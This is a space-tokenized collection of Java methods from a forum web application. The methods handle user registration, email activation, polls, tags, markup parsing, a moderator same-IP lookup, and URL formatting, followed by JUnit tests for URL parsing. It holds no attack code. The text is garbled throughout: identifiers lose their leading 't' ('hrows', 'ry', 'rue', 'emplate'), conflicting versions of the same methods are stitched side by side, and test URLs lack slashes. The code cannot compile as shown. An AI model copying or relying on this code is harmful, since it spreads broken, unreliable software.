public void activateUser ( User user ) { jdbcTemplate . update ( " UPDATE users SET activated='t' WHERE id=? " , user . getId ( ) ) ; } 
public ModelAndView register ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { User user = mpl . getCurrentUser ( ) ; 
public ModelAndView doRegister ( HttpServletRequest request , @RequestParam String email , @RequestParam ( required = false ) String own , @RequestParam ( required = false ) String info , @RequestParam ( required = false ) String name , @RequestParam ( required = false ) String url , @RequestParam ( required = false ) String password , @RequestParam ( required = false ) String password2 ) hrows Exception { HttpSession session = request . getSession ( ) ; Template mpl = Template . getTemplate ( request ) ; ry { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . rim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user . getId ( ) , null ) ; changeScore ( user . getId ( ) , - 10 ) ; } 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; return setPassword ( user , password ) ; } 
public void updateUser ( User user , String name , String url , String new_email , String own , String password , String info ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, new_email=?, town=? WHERE id=? " , name , url , new_email , own , user . getId ( ) ) ; if ( password ! = null ) { setPassword ( user , password ) ; } setUserInfo ( user . getId ( ) , info ) ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String own , String info ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForInt ( " select nextval('s_uid') as userid " ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , own ) ; if ( info ! = null ) { setUserInfo ( userid , info ) ; } return userid ; } 
public boolean isUserExists ( String nick ) { int c = jdbcTemplate . queryForInt ( " SELECT count(*) as c FROM users WHERE nick=? " , nick ) ; return c > 0 ; } 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized! " ) ; } User user = mpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { hrow new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( mpl . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { hrow new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
public void acceptNewEmail ( User user ) { jdbcTemplate . update ( " UPDATE users SET email=new_email WHERE id=? " , user . getId ( ) ) ; } 
private void initCurrentUser ( Connection db , boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } ry { currentUser = UserDao . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
public static User getUser ( Connection db , String nick ) hrows UserNotFoundException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return getUserInternal ( jdbcTemplate , nick ) ; } 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean useAbsoluteUrl ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , false , useAbsoluteUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public Poll getPollByTopicId ( int opicId ) hrows PollNotFoundException { ry { return getPoll ( jdbcTemplate . queryForInt ( queryPoolIdByTopicId , opicId ) ) ; 
public static SortedMap < Integer , String > oMap ( List < PollVariant > list ) { SortedMap < Integer , String > map = new TreeMap < Integer , String > ( ) ; for ( PollVariant v : list ) { map . put ( v . getId ( ) , v . getLabel ( ) ) ; } return map ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , false , null ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags , PreparedPoll newPoll ) { return prepareMessage ( message , ags , rue , false , newPoll ) ; } 
private PreparedMessage prepareMessage ( Message message , List < String > ags , boolean includeCut , boolean useAbsoluteUrl , PreparedPoll poll ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean useAbsoluteUrl ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , false , useAbsoluteUrl , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public Object doInConnection ( Connection db ) hrows SQLException , DataAccessException { if ( Strings . isNullOrEmpty ( label ) ) { var . remove ( db ) ; } else { var . updateLabel ( db , label ) ; } return null ; } 
public Object doInConnection ( Connection db ) hrows SQLException , DataAccessException { poll . addNewVariant ( db , var . getLabel ( ) ) ; return null ; } 
public boolean isMultiselect ( ) { return multiselect ; } 
public void createPoll ( List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( " INSERT INTO votenames (id, multiselect, topic) values (?,?,?) " , voteid , multiSelect , msgid ) ; ry { final Poll poll = getPoll ( voteid ) ; 
public void addNewVariant ( Poll poll , String label ) { jdbcTemplate . update ( " INSERT INTO votes (id, vote, label) values (nextval('votes_id'), ?, ?) " , 
public void removeVariant ( PollVariant variant ) { jdbcTemplate . update ( " DELETE FROM votes WHERE id=? " , variant . getId ( ) ) ; } 
public void performLogin ( HttpServletResponse response , User user ) { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; session . setAttribute ( " moderator " , user . canModerate ( ) ) ; session . setAttribute ( " corrector " , user . canCorrect ( ) ) ; userDao . updateLastlogin ( user ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
public void init ( FilterConfig filterConfig ) hrows ServletException { his . filterConfig = filterConfig ; WebApplicationContext ctx = WebApplicationContextUtils . getWebApplicationContext ( filterConfig . getServletContext ( ) ) ; properties = ( Properties ) ctx . getBean ( " properties " ) ; userDao = ( UserDao ) ctx . getBean ( " userDao " ) ; MemCachedSettings . setMainUrl ( properties . getProperty ( " MainUrl " ) ) ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) hrows ServletException , IOException { if ( filterConfig = = null ) { return ; } ry { Template mpl = new Template ( ( HttpServletRequest ) servletRequest , properties , ( HttpServletResponse ) servletResponse , userDao ) ; servletRequest . setAttribute ( " emplate " , mpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public User getUser ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { hrow new UserNotFoundException ( " <invalid name> " ) ; } Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; List < User > list = jdbcTemplate . query ( " SELECT id,nick,candel,canmod,corrector,passwd,blocked,score,max_score,activated,photo,email,name,unread_events FROM users where nick=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } User user = list . get ( 0 ) ; String cacheId = " User?id= " + user . getId ( ) ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
public User getUserCached ( int id ) hrows UserNotFoundException { return getUser ( id , rue ) ; } 
public User getUser ( int id ) hrows UserNotFoundException { return getUser ( id , false ) ; } 
private User getUser ( int id , boolean useCache ) hrows UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { List < User > list = jdbcTemplate . query ( " SELECT id, nick,score, max_score, candel,canmod,corrector,passwd,blocked,activated,photo,email,name,unread_events FROM users where id=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } res = list . get ( 0 ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public void updateLastlogin ( User user ) { jdbcTemplate . update ( " UPDATE users SET lastlogin=CURRENT_TIMESTAMP WHERE id=? " , user . getId ( ) ) ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { hrow new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " opics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; if ( blockInfo ! = null ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . getModel ( ) . put ( " or " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public TopicItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new TopicItem ( rs , false ) ; } 
public TopicItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new TopicItem ( rs , rue ) ; } 
public UserItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new UserItem ( rs , uaId ) ; } 
public ModelAndView serverInfo ( ) { List < User > moderators = userDao . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < User > correctors = userDao . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public void processRow ( ResultSet rs ) hrows SQLException { ags . add ( rs . getString ( " value " ) ) ; } 
public boolean updateTags ( final int msgid , final List < String > agList ) { final List < String > oldTags = getMessageTags ( msgid ) ; return jdbcTemplate . execute ( new ConnectionCallback < Boolean > ( ) { @Override 
public Boolean doInConnection ( Connection con ) hrows SQLException , DataAccessException { PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = rue ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = rue ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { User user = mpl . getCurrentUser ( ) ; 
public void estGetRequest ( ) { assertEquals ( " news/debian/6753486#comment-6753612 " , URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ; assertEquals ( " forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ; assertEquals ( " news/debian/6753486#comment-6753612 " , URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ; assertEquals ( " forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ; assertEquals ( " forum/talks/6893165?lastmod=1319027964738 " , URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ; assertEquals ( " forum/talks/6893165?lastmod=1319027964738 " , URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ; 
public void estGetMessageId ( ) { assertEquals ( 6753486 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6753486 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6890857 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 6890857 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 6893165 , URLUtil . getMessageIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ) ; 
public void estGetCommentId ( ) { assertEquals ( 6753612 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6753612 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ) ) ) ; assertEquals ( 6892917 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 6892917 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ) ) ) ; assertEquals ( 0 , URLUtil . getCommentIdFromRequest ( URLUtil . getRequestFromUrl ( MainUrl , " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ) ) ) ; 
public PreparedComment prepareComment ( Comment comment , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , ( CommentList ) null , secure ) ; } 
public PreparedComment prepareComment ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parser ( message , secure ) ; return new PreparedComment ( comment , author , processedMessage , null ) ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure ) ) ; } return commentsPrepared ; } 
public String mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return lorCodeService . parser ( ext , secure ) ; 
private static String cropSchemeFromUrl ( String url ) { String newUrl ; if ( url . startsWith ( " http: " ) ) { newUrl = url . substring ( 8 ) ; } else if ( url . startsWith ( " https: " ) ) { newUrl = url . substring ( 9 ) ; } else { newUrl = url ; } return newUrl ; } 
public static String formatLorUrl ( String mainUrl , int msgid , int cid , boolean secure ) { if ( msgid = = 0 | | cid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; String scheme ; if ( secure ) { scheme = " https: " ; } else { scheme = " http: " ; } return String . format ( " %s%s/jump-message.jsp?msgid=%d&cid=%d " , scheme , mainUrl , msgid , cid ) ; } 
public static boolean isSecureUrl ( String url ) { return url . startsWith ( " https: " ) ; } 
public String parser ( String ext ) { return parser ( ext , rue , rue , " " , false ) ; } 
public String parser ( String ext , boolean secure ) { return parser ( ext , rue , rue , " " , secure ) ; } 
public String parser ( String ext , boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { return defaultParser . parseRoot ( prepareRootNode ( renderCut , cleanCut , cutUrl , secure ) , ext ) . renderXHtml ( ) ; } 
public ParserResult parserWithReplies ( String ext ) { return parserWithReplies ( ext , rue , rue , " " , false ) ; } 
public ParserResult parserWithReplies ( String ext , boolean secure ) { return parserWithReplies ( ext , rue , rue , " " , secure ) ; } 
public ParserResult parserWithReplies ( String ext , boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode parsedRootNode = defaultParser . parseRoot ( prepareRootNode ( renderCut , cleanCut , cutUrl , secure ) , ext ) ; return new ParserResult ( parsedRootNode . renderXHtml ( ) , parsedRootNode . getReplier ( ) ) ; } 
private RootNode prepareRootNode ( boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; rootNode . setConfiguration ( configuration ) ; rootNode . setSecure ( secure ) ; return rootNode ; } 
public RootNode parseRoot ( RootNode rootNode , String ext ) { return parse ( rootNode , ext ) ; } 
private static String cropSchemeFromUrl ( String url ) { String newUrl ; if ( url . startsWith ( " http: " ) ) { newUrl = url . substring ( 7 ) ; } else if ( url . startsWith ( " https: " ) ) { newUrl = url . substring ( 8 ) ; } else { newUrl = url ; } return newUrl ; } 
public static String formatLorUrl ( String mainUrl , int msgid , int cid , boolean secure ) { if ( msgid = = 0 | | cid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return String . format ( " %s:%sjump-message.jsp?msgid=%d&cid=%d " , scheme , cropMainUrl , msgid , cid ) ; } 
private RootNode prepareRootNode ( boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; rootNode . setMessageDao ( messageDao ) ; rootNode . setConfiguration ( configuration ) ; rootNode . setSecure ( secure ) ; return rootNode ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_FORUM , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_NEWS , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " highlight " , required = false ) Set < Integer > highlight ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_POLLS , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , Section . SECTION_GALLERY , groupName , msgid , cid ) ; } return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public Group getGroup ( Message message ) hrows BadGroupException { return groupDao . getGroup ( message . getGroupId ( ) ) ; } 
public static String formatJumpUrl ( String mainUrl , Group group , int msgid , int cid , boolean secure ) hrows Exception { String groupUrl = group . getUrl ( ) ; if ( msgid = = 0 | | cid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; if ( cropMainUrl . endsWith ( " / " ) ) { cropMainUrl = cropMainUrl . substring ( 0 , cropMainUrl . length ( ) - 1 ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return String . format ( " %s:%s%s%d?cid=%d " , scheme , cropMainUrl , groupUrl , msgid , cid ) ; } 
public static String formatJumpUrl ( String mainUrl , Group group , int msgid , int cid , boolean secure ) hrows Exception { String groupUrl = group . getUrl ( ) ; if ( msgid = = 0 | | " " . equals ( mainUrl ) ) { return " " ; } String cropMainUrl = cropSchemeFromUrl ( mainUrl ) ; if ( cropMainUrl . endsWith ( " / " ) ) { cropMainUrl = cropMainUrl . substring ( 0 , cropMainUrl . length ( ) - 1 ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } if ( cid ! = 0 ) { return String . format ( " %s:%s%s%d?cid=%d " , scheme , cropMainUrl , groupUrl , msgid , cid ) ; 
public boolean isTrueLorUrl ( ) { return isTrueLorUrl ; } 
public boolean isMessageUrl ( ) { return isMessageUrl ; } 
public boolean isCommentUrl ( ) { return isCommentUrl ; } 
public String fixScheme ( boolean secure ) hrows URIException { String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorUri . getHost ( ) ; int port = lorUri . getPort ( ) ; String path = lorUri . getPath ( ) ; String query = lorUri . getQuery ( ) ; String fragment = lorUri . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public String formatJump ( MessageDao messageDao , boolean secure ) hrows MessageNotFoundException , BadGroupException , URIException { if ( isMessageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainUri . getHost ( ) ; int port = mainUri . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( isCommentUrl ( ) ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public void initTest ( ) hrows Exception { messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; } 
public void est1 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url1 ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est2 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est3 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est4 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url4 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est5 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url5 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
